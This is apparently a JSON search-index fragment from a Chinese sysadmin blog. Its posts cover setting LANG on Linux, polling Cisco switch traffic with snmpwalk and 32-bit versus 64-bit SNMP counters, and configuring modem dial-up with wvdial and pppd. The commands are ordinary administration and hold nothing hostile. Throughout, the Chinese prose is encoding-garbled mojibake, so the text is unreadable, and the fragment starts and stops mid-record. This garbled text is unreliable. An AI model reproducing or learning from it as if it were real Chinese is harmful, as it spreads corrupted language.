class=\"nv\"\u003eSUPPORTED\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;zh_CN.UTF-8:zh_CN:zh:zh_TW.UTF-8:zh_TW:zh:en_US.UTF-8:en_US:en\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSYSFONT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;latarcyrheb-sun16\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e------\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linuxä¸‹è®¾ç½®LANGå˜é‡"},{"content":"æƒ³è‡ªå·±ç”»å›¾æ¥ç›‘æ§äº¤æ¢æœºçš„æµé‡ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯é€šè¿‡snmpwalkæ¥å¾—åˆ°äº¤æ¢æœºçš„è¿›å‡ºæµé‡ï¼š\næˆ‘ä»¬ç”¨å¾—æ˜¯Cisco 3750çš„24å£äº¤æ¢æœºï¼Œç»™ä¸ªOIDè¡¨ï¼š\nå…ˆçœ‹ä¸€ä¸‹äº¤æ¢æœºçš„ç«¯å£æƒ…å†µï¼š\nsnmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.2 å¾—åˆ°ä¸€å †ä¿¡æ¯ï¼Œé—®ç½‘ç»œå·¥ç¨‹å¸ˆå¾—åˆ°1/0/5å’Œ2/0/5è¿™ä¸¤ä¸ªç«¯å£æ˜¯åŒä¸Šè¿çº¿è·¯ï¼š\nIF-MIB::ifDescr.10105 = STRING: GigabitEthernet1/0/5 IF-MIB::ifDescr.10605 = STRING: GigabitEthernet2/0/5 è®°ä½ä¸¤ä¸ªç«¯å£çš„æè¿°ç¬¦ï¼Œ10105å’Œ10605.\nç»§ç»­ï¼Œæˆ‘ä»¬çœ‹ä¸Šè¡¨ï¼Œ.1.3.6.1.2.1.2.2.1.10(æ¥å£æ”¶åˆ°çš„å­—èŠ‚æ•°)ï¼Œæˆ‘ä»¬è¦å¾—åˆ°æŸä¸ªå…·ä½“ç«¯å£æ”¶åˆ°çš„å­—èŠ‚æ•°ï¼Œå°±å¿…é¡»åŠ ä¸Šç«¯å£çš„æè¿°ç¬¦äº†ã€‚æ‰€ä»¥è¦å¾—åˆ°1/0/5çš„æ”¶åˆ°å­—èŠ‚æ•°ï¼Œå°±æ˜¯.1.3.6.1.2.1.2.2.1.10.10105\n#snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.10.10105 IF-MIB::ifInOctets.10105 = Counter32: 2198534228 okï¼Œæ‹¿åˆ°å­—èŠ‚æ•°äº†ï¼Œç„¶åå•ä½æ˜¯bytesï¼Œæ¢ç®—æˆbit(*8)ï¼Œç„¶åé™¤è‹¥å¹²1024ï¼Œå¾—åˆ°å•ä½mï¼Œg, tç­‰ï¼Œå…¥åº“ï¼Œç„¶åè°ƒhichartç”»å›¾å³å¯ã€‚\nç„¶è€Œï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œçœ‹æ¸…ä¸Šé¢çš„å•ä½ï¼ŒCounter32ï¼Œå‘µå‘µï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ä¸å¯¹çš„ã€‚ç°å¦‚ä»Šçš„ç½‘ç»œå¤šæ˜¯åƒå…†ç½‘å¡äº†ï¼Œæ‰€ä»¥counter32æ˜¯ä¸å¯¹çš„, 100Mbpsä»¥ä¸Šå¿…é¡»ä½¿ç”¨Counter64çš„å•ä½ï¼Œç»™ä¸ªå¯¹ç…§è¡¨ï¼š\né«˜é€Ÿç½‘å¡(100å…†ä»¥ä¸Šï¼‰:\nifHCInOctets: 1.3.6.1.2.1.31.1.1.1.6 (64-bit Octets in counter) ifHCOutOctets: 1.3.6.1.2.1.31.1.1.1.10 (64-bit Octets out counter) ifHCInUcastPkts: 1.3.6.1.2.1.31.1.1.1.7 (64-bit Packets in counter) ifHCOutUcastPkts: 1.3.6.1.2.1.31.1.1.1.11 (64-bit Packets out counter) ifHighSpeed: 1.3.6.1.2.1.31.1.1.1.15 (An estimate of the interface\u0026rsquo;s current bandwidth in units of 1Mbps) ä½é€Ÿç½‘å¡ï¼š\nifInOctets: 1.3.6.1.2.1.2.2.1.10 (32-bit Octets in counter) ifOutOctets: 1.3.6.1.2.1.2.2.1.16 (32-bit Octets out counter) ifInUcastPkts: 1.3.6.1.2.1.2.2.1.11 (32-bit Packets in counter) ifOutUcastPkts: 1.3.6.1.2.1.2.2.1.17 (32-bit Packets out counter) ifSpeed: 1.3.6.1.2.1.2.2.1.5 (Currently negotiated speed of the interface - Max: 4.294 Gbps) è¯¦ç»†è§£é‡Šä¸‹ï¼šifInOctetsæ˜¯32-bitæ— ç¬¦æ•´æ•°ï¼Œ2çš„32æ¬¡æ–¹æ˜¯4,294,967,296ã€‚å»æ‰0ï¼Œæ‰€ä»¥èŒƒå›´æ˜¯0-4,294,967,295ï¼Œå¤§æ¦‚æ˜¯34gçš„bit. å¦‚æœæŒ‰ç½‘é€Ÿ74-92Mbpsæ¥ç®—, å¤§æ¦‚6åˆ†é’Ÿå°±ä¼šå¡«æ»¡ï¼Œ92Mbps * 60seconds *6minutes = 33gigabits.æ‰€ä»¥å¡«æ»¡æ˜¯å¾ˆå¿«çš„ï¼Œå¦‚æœä½ æ­£å¥½åœ¨è¿™æœŸé—´è¯»å–æ•°æ®ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šè¯»é”™ã€‚\næ‰€ä»¥å‘½ä»¤åº”è¯¥æ˜¯ï¼š\nsnmpwalk -v 2c -c xxxxxxxx 172.16.1.1 1.3.6.1.2.1.31.1.1.1.6.10105 æœ€åé™„ä¸Šè®¡ç®—æµé‡çš„å…¬å¼ï¼š\n(ifInOctetsCurrent - ifInOctetsPrevious) * 8 / pollingSeconds ","permalink":"https://rendoumi.com/posts/20240108-snmp_network/","summary":"\u003cp\u003eæƒ³è‡ªå·±ç”»å›¾æ¥ç›‘æ§äº¤æ¢æœºçš„æµé‡ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯é€šè¿‡snmpwalkæ¥å¾—åˆ°äº¤æ¢æœºçš„è¿›å‡ºæµé‡ï¼š\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç”¨å¾—æ˜¯Cisco 3750çš„24å£äº¤æ¢æœºï¼Œç»™ä¸ªOIDè¡¨ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240108142515825\" loading=\"lazy\" src=\"/posts/20240108-snmp_network/image-20240108142515825.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆçœ‹ä¸€ä¸‹äº¤æ¢æœºçš„ç«¯å£æƒ…å†µï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.2  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¾—åˆ°ä¸€å †ä¿¡æ¯ï¼Œé—®ç½‘ç»œå·¥ç¨‹å¸ˆå¾—åˆ°1/0/5å’Œ2/0/5è¿™ä¸¤ä¸ªç«¯å£æ˜¯åŒä¸Šè¿çº¿è·¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIF-MIB::ifDescr.10105 \u003cspan class=\"o\"\u003e=\u003c/span\u003e STRING: GigabitEthernet1/0/5  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIF-MIB::ifDescr.10605 \u003cspan class=\"o\"\u003e=\u003c/span\u003e STRING: GigabitEthernet2/0/5  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè®°ä½ä¸¤ä¸ªç«¯å£çš„æè¿°ç¬¦ï¼Œ10105å’Œ10605.\u003c/p\u003e\n\u003cp\u003eç»§ç»­ï¼Œæˆ‘ä»¬çœ‹ä¸Šè¡¨ï¼Œ.1.3.6.1.2.1.2.2.1.10(æ¥å£æ”¶åˆ°çš„å­—èŠ‚æ•°)ï¼Œæˆ‘ä»¬è¦å¾—åˆ°æŸä¸ªå…·ä½“ç«¯å£æ”¶åˆ°çš„å­—èŠ‚æ•°ï¼Œå°±å¿…é¡»åŠ ä¸Šç«¯å£çš„æè¿°ç¬¦äº†ã€‚æ‰€ä»¥è¦å¾—åˆ°1/0/5çš„æ”¶åˆ°å­—èŠ‚æ•°ï¼Œå°±æ˜¯.1.3.6.1.2.1.2.2.1.10.10105\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.10.10105\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIF-MIB::ifInOctets.10105 \u003cspan class=\"o\"\u003e=\u003c/span\u003e Counter32: \u003cspan class=\"m\"\u003e2198534228\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eokï¼Œæ‹¿åˆ°å­—èŠ‚æ•°äº†ï¼Œç„¶åå•ä½æ˜¯bytesï¼Œæ¢ç®—æˆbit(*8)ï¼Œç„¶åé™¤è‹¥å¹²1024ï¼Œå¾—åˆ°å•ä½mï¼Œg, tç­‰ï¼Œå…¥åº“ï¼Œç„¶åè°ƒhichartç”»å›¾å³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶è€Œï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œçœ‹æ¸…ä¸Šé¢çš„å•ä½ï¼ŒCounter32ï¼Œå‘µå‘µï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ä¸å¯¹çš„ã€‚ç°å¦‚ä»Šçš„ç½‘ç»œå¤šæ˜¯åƒå…†ç½‘å¡äº†ï¼Œæ‰€ä»¥counter32æ˜¯ä¸å¯¹çš„, 100Mbpsä»¥ä¸Šå¿…é¡»ä½¿ç”¨Counter64çš„å•ä½ï¼Œç»™ä¸ªå¯¹ç…§è¡¨ï¼š\u003c/p\u003e\n\u003cp\u003eé«˜é€Ÿç½‘å¡(100å…†ä»¥ä¸Šï¼‰:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eifHCInOctets: 1.3.6.1.2.1.31.1.1.1.6 (64-bit Octets in counter)\u003c/li\u003e\n\u003cli\u003eifHCOutOctets: 1.3.6.1.2.1.31.1.1.1.10 (64-bit Octets out counter)\u003c/li\u003e\n\u003cli\u003eifHCInUcastPkts:  1.3.6.1.2.1.31.1.1.1.7 (64-bit Packets in counter)\u003c/li\u003e\n\u003cli\u003eifHCOutUcastPkts:  1.3.6.1.2.1.31.1.1.1.11 (64-bit Packets out counter)\u003c/li\u003e\n\u003cli\u003eifHighSpeed: 1.3.6.1.2.1.31.1.1.1.15 (An estimate of the interface\u0026rsquo;s current bandwidth in units of 1Mbps)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eä½é€Ÿç½‘å¡ï¼š\u003c/p\u003e","title":"SNMP OIDæ¥ç›‘æ§ç½‘ç»œè®¾å¤‡æµé‡"},{"content":"å…¬å¸ä¸ºäº†è·Ÿå»ºè®¾é“¶è¡Œå»ºç«‹ä¸“çº¿ï¼Œé¦–å…ˆç”¨ç”µè¯çº¿æ‹¨å·è¿›è¡Œæµ‹è¯•ã€‚ ä¹°å›æ¥ä¸€ä¸ªå¤–ç½®çš„Modemï¼Œæ¥åœ¨æœåŠ¡å™¨çš„com1å£ä¸Šï¼Œå…ˆç”¨ç”µè¯æµ‹è¯•ä¸€ä¸‹ï¼ŒOKæ²¡é—®é¢˜ï¼Œé‚£å°±ç»§ç»­é…modemæ‹¨å·\nLinuxä¸‹é…ç½®Modemæ‹¨å·æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¼ ç»Ÿçš„pppdæ–¹å¼å’Œç®€å•çš„wvdialæ–¹å¼ã€‚\nä¸€ã€wvdialé…ç½® wvdialçš„é…ç½®æ–¹æ³•è¶…çº§ç®€å•ï¼Œ æ‰§è¡Œå‘½ä»¤ï¼šwvdialconf /etc/wvdial.conf å®ƒä¼šè‡ªåŠ¨æµ‹å‡ºç³»ç»Ÿçš„Modemï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼ŒåŠ å‡ ä¸ªå‚æ•°ï¼š\nvi /etc/wvdial.conf [Dialer Defaults] Modem = /dev/ttyS0 Baud = 115200 Init1 = ATZ Init2 = ATQ0 V1 E1 S0=0 \u0026amp;C1 \u0026amp;D2 +FCLASS=0 ISDN = 0 Auto Reconnect = on Modem Type = Analog Modem Phone =0,28929191 Username = ttt Password = qqq è¿™å°±å¼„å¥½äº†ï¼Œæ‰§è¡Œwvdail \u0026amp;å°±å¯ä»¥æ‹¨å·äº†ï¼Œç»“æŸä¹Ÿå¾ˆç®€å•ï¼Œkill -9 æ€æ‰wvdialå’Œppdè¿›ç¨‹å³å¯ã€‚\næ³¨æ„ï¼šwvdial æ‹¨é€šåç³»ç»Ÿå¤šäº†ä¸€å—ç½‘å¡ppp0ï¼Œè·¯ç”±ä¿¡æ¯éƒ½æœªä¿®æ”¹ï¼Œä¸ºäº†èƒ½åˆ°è¾¾å»ºè¡Œçš„æœåŠ¡å™¨ï¼Œéœ€è¦ç¼–è¾‘/etc/ppp/ip-upæ–‡ä»¶ï¼ŒåŠ ä¸€å¥ï¼š\nroute add -host 12.0.98.150 gw 12.0.98.236 ç„¶åé‡æ‹¨pingä¸€ä¸‹ï¼Œping 12.0.98.150ï¼Œèƒ½pingé€šå°±è¯´æ˜okäº†ã€‚\näºŒã€pppdé…ç½® wvdialéšè—äº†å¾ˆå¤šä¿¡æ¯ï¼Œæˆ‘ä»¬ä¸‹é¢ç”¨pppdæ¥çœ‹çœ‹çœŸå®çš„æ‹¨å·è¿‡ç¨‹å§ï¼š\nå…¶å®modemæ‹¨å·è®¤è¯çš„æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯æ˜¾ç¤ºæ˜æ–‡çš„login:(username:)æ–¹å¼ï¼Œå¦ä¸€ç§æ˜¯æ˜¾ç¤ºä¹±ç çš„pap(chap)æ–¹å¼ã€‚\nâ‘ é¦–å…ˆï¼š\nvi /etc/ppp/options lock crtscts defaultroute noauth â‘¡æ¸…ç†ä¸€ä¸‹è€çš„è¿æ¥ï¼š\nkillall pppd rm /var/lock/LCK..ttyS0 â‘¢æ‰¾å‡ºè®¤è¯çš„æ–¹å¼ï¼š\n/usr/sbin/pppd /dev/ttyS0 115200 debug connect \u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; \u0026#39;AT\u0026amp;F0\u0026#39; OK ATD0,28929191 CONNECT \u0026#39;dc\u0026#39; \u0026#34; less /var/log/messages\nå¦‚æœçœ‹è§ä»€ä¹ˆlogin usernameä¹‹æµçš„é‚£å°±æ˜¯æ˜æ–‡è®¤è¯ï¼Œå¦‚æœç±»ä¼¼ä¸‹é¢çš„ï¼Œçœ‹è§äº†ï¼Œé‚£å°±æ˜¯pap(chap)æ–¹å¼ã€‚\npppd 2.4.2 started by root, uid 0 Removed stale lock on ttyS0 (pid 3561) send (AT^M) expect (OK) AT^M^M OK -- got it send (ATD0,28929191^M) expect (CONNECT) ^M ATD0,28929191^M^M CONNECT -- got it send (d) Serial connection established. using channel 2 Using interface ppp0 Connect: ppp0 \u0026lt;--\u0026gt; /dev/ttyS0 sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] rcvd [LCP ConfReq id=0x1 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0xebe7666\u0026gt;] sent [LCP ConfAck id=0x1 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0xebe7666\u0026gt;] sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] rcvd [LCP ConfReq id=0x2 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0x125e3a73\u0026gt;] sent [LCP ConfAck id=0x2 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0x125e3a73\u0026gt;] å¦‚æœæ˜¯æ˜æ–‡è®¤è¯ï¼š\n/usr/sbin/pppd /dev/ttyS0 115200 debug connect \u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; ATDT0,28929191 CONNECT \u0026#39;\u0026#39; ogin: ttt assword: qqq\u0026#34; å¦‚æœæ˜¯pap(chap)è®¤è¯ï¼š\n/usr/sbin/pppd /dev/ttyS0 115200 debug user ttt connect \u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; ATDT0,28929191 CONNECT \u0026#39;dc\u0026#39; \u0026#34; çœ‹å‡ºåŒºåˆ«äº†å§ï¼Œpap(chap)è·Ÿæ˜æ–‡çš„åŒºåˆ«å°±åœ¨äºå¤šäº†ä¸€ä¸ª user ttt çš„å‚æ•°ã€‚ è¿™å°±æ˜¯pppdæ‹¨å·çš„è¯¦ç»†è¿‡ç¨‹äº†ï¼Œæ–­æ‰æ‹¨å·è¿æ¥å°±ç”¨killall pppdå³å¯ã€‚ å¤§å®¶å¯ä»¥æŠŠè¿™ä¹ˆé•¿çš„ä¸€è¡Œå‘½ä»¤å†™åˆ°shé‡Œï¼Œå°±å¥½çœ‹äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240108-modem_dial/","summary":"\u003cp\u003eå…¬å¸ä¸ºäº†è·Ÿå»ºè®¾é“¶è¡Œå»ºç«‹ä¸“çº¿ï¼Œé¦–å…ˆç”¨ç”µè¯çº¿æ‹¨å·è¿›è¡Œæµ‹è¯•ã€‚ ä¹°å›æ¥ä¸€ä¸ªå¤–ç½®çš„Modemï¼Œæ¥åœ¨æœåŠ¡å™¨çš„com1å£ä¸Šï¼Œå…ˆç”¨ç”µè¯æµ‹è¯•ä¸€ä¸‹ï¼ŒOKæ²¡é—®é¢˜ï¼Œé‚£å°±ç»§ç»­é…modemæ‹¨å·\u003c/p\u003e\n\u003cp\u003eLinuxä¸‹é…ç½®Modemæ‹¨å·æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¼ ç»Ÿçš„pppdæ–¹å¼å’Œç®€å•çš„wvdialæ–¹å¼ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€wvdialé…ç½®\"\u003eä¸€ã€wvdialé…ç½®\u003c/h2\u003e\n\u003cp\u003ewvdialçš„é…ç½®æ–¹æ³•è¶…çº§ç®€å•ï¼Œ\næ‰§è¡Œå‘½ä»¤ï¼š\u003ccode\u003ewvdialconf /etc/wvdial.conf\u003c/code\u003e\nå®ƒä¼šè‡ªåŠ¨æµ‹å‡ºç³»ç»Ÿçš„Modemï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼ŒåŠ å‡ ä¸ªå‚æ•°ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/wvdial.conf \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eDialer Defaults\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eModem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /dev/ttyS0  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBaud\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e115200\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eInit1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ATZ  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eInit2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ATQ0 V1 E1 \u003cspan class=\"nv\"\u003eS0\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003eC1 \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003eD2 +FCLASS\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eISDN\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAuto \u003cspan class=\"nv\"\u003eReconnect\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e on  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eModem \u003cspan class=\"nv\"\u003eType\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Analog Modem  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePhone\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e0,28929191  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUsername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ttt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e qqq  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™å°±å¼„å¥½äº†ï¼Œæ‰§è¡Œwvdail \u0026amp;å°±å¯ä»¥æ‹¨å·äº†ï¼Œç»“æŸä¹Ÿå¾ˆç®€å•ï¼Œkill -9 æ€æ‰wvdialå’Œppdè¿›ç¨‹å³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼šwvdial æ‹¨é€šåç³»ç»Ÿå¤šäº†ä¸€å—ç½‘å¡ppp0ï¼Œè·¯ç”±ä¿¡æ¯éƒ½æœªä¿®æ”¹ï¼Œä¸ºäº†èƒ½åˆ°è¾¾å»ºè¡Œçš„æœåŠ¡å™¨ï¼Œéœ€è¦ç¼–è¾‘/etc/ppp/ip-upæ–‡ä»¶ï¼ŒåŠ ä¸€å¥ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroute add -host 12.0.98.150 gw 12.0.98.236 \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åé‡æ‹¨pingä¸€ä¸‹ï¼Œping 12.0.98.150ï¼Œèƒ½pingé€šå°±è¯´æ˜okäº†ã€‚\u003c/p\u003e\n\u003ch2 id=\"äºŒpppdé…ç½®\"\u003eäºŒã€pppdé…ç½®\u003c/h2\u003e\n\u003cp\u003ewvdialéšè—äº†å¾ˆå¤šä¿¡æ¯ï¼Œæˆ‘ä»¬ä¸‹é¢ç”¨pppdæ¥çœ‹çœ‹çœŸå®çš„æ‹¨å·è¿‡ç¨‹å§ï¼š\u003c/p\u003e\n\u003cp\u003eå…¶å®modemæ‹¨å·è®¤è¯çš„æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯æ˜¾ç¤ºæ˜æ–‡çš„login:(username:)æ–¹å¼ï¼Œå¦ä¸€ç§æ˜¯æ˜¾ç¤ºä¹±ç çš„pap(chap)æ–¹å¼ã€‚\u003c/p\u003e\n\u003cp\u003eâ‘ é¦–å…ˆï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/ppp/options  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elock  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrtscts  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefaultroute  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enoauth  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eâ‘¡æ¸…ç†ä¸€ä¸‹è€çš„è¿æ¥ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekillall pppd  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erm /var/lock/LCK..ttyS0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eâ‘¢æ‰¾å‡ºè®¤è¯çš„æ–¹å¼ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/sbin/pppd /dev/ttyS0 \u003cspan class=\"m\"\u003e115200\u003c/span\u003e debug connect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/usr/sbin/chat -v   \u0026#39;\u0026#39;   \u0026#39;AT\u0026amp;F0\u0026#39;   OK\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eATD0,28929191   CONNECT   \u0026#39;dc\u0026#39; \u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eless /var/log/messages\u003c/p\u003e","title":"Linuxä¸‹é…ç½®Modemæ‹¨å·"},{"content":"æˆ‘ä»¬çš„å®¹å™¨é‡‡ç”¨çš„æ˜¯lxcç±»å‹ï¼Œä¸€æ˜¯ä¸ºäº†å›ºå®šipï¼ŒäºŒæ˜¯é¿å¼€iptableç±»å‹è½¬å‘çš„æ–¹å¼ã€‚å› 